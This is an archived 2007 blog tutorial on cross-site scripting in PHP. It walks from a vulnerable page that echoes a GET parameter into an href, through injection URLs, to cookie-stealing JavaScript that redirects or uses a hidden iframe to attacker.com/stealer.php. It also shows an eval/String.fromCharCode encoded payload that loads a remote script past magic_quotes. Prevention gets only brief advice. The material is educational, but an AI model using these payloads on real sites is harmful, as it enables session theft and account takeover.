---
archive: https://wayback.archive-it.org/22123/20231101171300/https://eve.gd/2007/05/23/xss-tutorial
categories:
- Information Security
comments: []
date: 2007-05-23 17:11:33 +0200
date_gmt: 2007-05-23 17:11:33 +0200
doi: https://doi.org/10.59348/292sw-5rq74
roguescholar: https://rogue-scholar.org/records/z7c79-8jh16
atproto: at://did:plc:hnpt7ns2lecdujegbi6qkqqm/site.standard.document/3mq7mnhx4nq2i
image:
  feature: geek.png
layout: post
ogImage: images/geek.png
published: true
status: publish
tags:
- information security
- XSS
title: XSS Tutorial
wordpress_id: 278
wordpress_url: http://pro.grammatic.org/post-xss-tutorial-20.aspx
atUri: "at://did:plc:hnpt7ns2lecdujegbi6qkqqm/site.standard.document/3mq7mnhx4nq2i"
kcworks: https://works.hcommons.org/records/h6crp-ezh60
references:
- http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd # W3C XHTML 1.1 DTD
- http://www.w3.org/1999/xhtml # W3C XHTML namespace URI
- http://www.attacker.com/stealer.php?cookie= # Illustrative cookie-stealing attacker script URL
- http://www.attacker.com/stealer.php # Illustrative cookie-stealing attacker script URL
---

<p>This page is designed to give an overview of Cross Site Scripting attacks on web sites, how they come into being, how to exploit them and how to protect against them.</p>
<p>To fully comprehend Cross Site Scripting, or XSS as it is known (CSS is NOT used as an abbreviation because it causes confusion when talking about Cascading Style Sheets), it is necessary to have a basic understanding of (X)HTML, JavaScript and Server Side Scripting. For the purposes of this tutorial the server side scripting language used in examples will be PHP, but this entire document is equally applicable to ASP, JSP and .NET.</p>
<p>To begin with, consider the following basic PHP page, test.php:</p>

{% highlight html %}

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >

	<head>
		<title>XSS Introduction</title>
	</head>

	<body>
		<a href="<?php echo $_GET['linklocation']; ?>">This is a link</a>
	</body>

</html>

{% endhighlight %}

<p>This page takes the url GET parameter "linklocation" and puts it as the href property of the link tag, so visiting test.php?linklocation=test.htm will render the link as:</p>

{% highlight html %}
<a href="test.htm">This is a link</a>
{% endhighlight %}

<p>So far so good.</p>
<p>However, this page is vulnerable to a Cross Site Scripting attack because it does not perform sanitization of the input. It is quite clear to a human that the intention of the script is to write the user input into the href attribute of the link tag. However, it is possible with this script to inejct malicious input that will close the href attribute and therefore write the contents of our user input directly into the XHTML document. For an example of this consider the following url:</p>

{% highlight html %}
test.php?linklocation=test.htm" style=color:red>link1</a> <a href="test2.htm

{% endhighlight %}


<p>When this url is passed to the above script some interesting things happen. When the first " is encountered the input has succesfully closed the href attribute and is writing directly into the document - in this case adding an additional style attribute to the link and then writing out an entirely new second link tag! The rendered HTML from this injection looks like this:</p>

{% highlight html %}
<a href="test.htm%5C" style="color: red;">link1</a> <a href="%5C%22test2.htm%22">This is a link</a>
{% endhighlight %}

<p>But hang on, what are those funny %5C things? These are inserted automatically in PHP's attempt to protect the programmer by a system known as <a href="http://uk3.php.net/magic_quotes">magic_quotes</a> which automatically inserts a \ (backslash) before any type of quote (single or double). This is because, in many circumstances, this will protect you from injection attacks as \" is not normally considered the same as " - except this has no effect on XHTML, so in this instance, magic_quotes is NOT sufficient protection.</p>
<p>As you can see if you run this example what is actually generated are two hyperlinks, one red and the other plain.</p>
<p>So what? Why is this useful? Well, firstly it should be fairly obvious that an attacker can easily write their own malicious content into a website in this fashion, but secondly, and more dangerously, they can inject the &lt;script&gt; attribute which enables them to execute code in the context of the victim's browser.</p>
<p>As an initial proof of concept of this, consider the following url:</p>

{% highlight html %}
test.php?linklocation=test.htm%22 >who cares</a><script>alert(1)</script><a href="test.htm
{% endhighlight %}

<p>which generates:</p>

{% highlight html %}
<a href="test.htm%5C">who cares</a><script>alert(1)</script><a href="%5C%22test.htm%22">This is a link</a>
{% endhighlight %}

<p>Running this url will cause a pop-up dialog to appear with "1" as its text. However, now we can inject any JavaScript, there is far more potential for danger than just popping up dialog boxes. The document.cookie property contains all the cookie data for a site, data which, if transmitted to an attacker, will theoretically allow them to impersonate the victim's login details.</p>
<p>There are two main ways to transmit cookie data from the victim to the attacker by JavaScript. The first is very unsubtle and involves the JavaScript code:</p>

{% highlight html %}
document.location = 'http://www.attacker.com/stealer.php?cookie=' + document.cookie;
{% endhighlight %}

<p>This method is unsubtle to say the least. The victim will be redirected to the attacker's site and will see that their cookies have been transmitted. Those with basic JavaScript understanding might at this point wonder "why not transmit the cookies by AJAX?" The reason for this is that XMLHttpRequest (the mechanism behind AJAX) is limited to transmitting requests to the same domain - in other words www.victim.com (where the JavaScript is "hosted") cannot send an AJAX request to www.attacker.com. So, what can be done to silently obtain a user's cookies? The answer lies in the iframe tag using the following JavaScript code which has only been tested in FireFox:</p>

{% highlight javascript %}


	var url = "http://www.attacker.com/stealer.php";

	url = url + "?cookie=" + document.cookie;

	var body = document.getElementsByTagName('body').item(0);

	var iframe = document.createElement('iframe');
	iframe.src = url;
	iframe.setAttribute("style", "display:none;");
	body.appendChild(iframe);

{% endhighlight %}

<p>This code creates an invisible iframe at the bottom of the page's <body> tag that silently loads attacker.com/stealer.php and sends the cookies.</p>
<p>The attentive reader may at this point be wondering how this is of any use to us, after all I stated earlier that magic_quotes will encapsulate any "s and 's as \" and \' respectively - something that JavaScript is not going to be happy with and also that, with all that code, it's going to be one lengthy URL! The simple answer is that this can be overcome by loading an external script into the document. Again, were magic_quotes disabled we could use the handy document.write("&lt;script etc.") but, alas, the "s are converted into \". So, how can we bypass this? Well, the first way is by encoding the input. JavaScript has a function named eval() which will execute any JavaScript passed to it as a string. There is also a static member of the String object called .fromCharCode which will create a string from ascii characters passed to it. You can encode your own JavaScript using my <a href="http://www.martineve.com/2007/05/23/string-fromcharcode-encoder/">encoding tool</a>. So,</p>

{% highlight javascript %}
document.write('<script src="http://www.attacker.com/remote.js" />')
{% endhighlight %}

<p>becomes</p>

{% highlight javascript %}
eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,
99,61,34,104,116,116,112,58,47,47,119,119,119,46,97,116,116,97,99,107,101,114,46,99,111,109,47,114,101,109,111,116,101,46,
106,115,34,32,47,62,39,41))
{% endhighlight %}

<p>which contains no nasty input for magic_quotes to try and filter. Visiting this url</p>

{% highlight javascript %}
test.php?linklocation=test.htm%22%3Etest%3C/a%3E%3Cscript%3E%20%20%20%20eval(String.fromCharCode(100,111,99,
117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,119,119,
119,46,97,116,116,97,99,107,101,114,46,99,111,109,47,114,101,109,111,116,101,46,106,115,34,32,47,62,39,41))%3C/script%3E%3Ca%20href=%22test1.htm
{% endhighlight %}

<p>results in the following in-browser render:</p>

{% highlight html %}
<script src="http://www.attacker.com/remote.js"></script>
{% endhighlight %}

<p>So now it is possible to load a remote script into the victim's browser and the attacker is free from complex encodings using fromCharCode and the such like. It is worth mentioning at this stage that this is by no means the only way to inject a remote script into the page and that my preferred method is XBL injection by using the -moz-binding value of the style attribute - but that's another story.</p>
<p>I want to use the closing lines of this section on exploiting XSS to point out that stealing cookies is NOT the only action that can be taken. Now that the attacker has injected a full length JavaScript document into the host it is possible to take almost any action that the user would (the exception being to upload files) including submitting forms, resetting passwords/emails - you name it, it's doable.</p>
<p>So, how can XSS attacks be prevented? It is important to sanitize input on both the inward and outward phases of processing - if data comes in (eg. from a cookie) - treat it as malicious and DO NOT put any of its data onto a page until it has been sanitized. Furthermore, if you are using PHP check out the <a href="http://groups.google.de/group/php-ids">PHP IDS</a>, a project to detect malicious input.</p>
<p>For a list of common XSS attack vectors, check out <a href="http://ha.ckers.org/xss.html">Rsnake's XSS Cheat Sheet</a>.</p>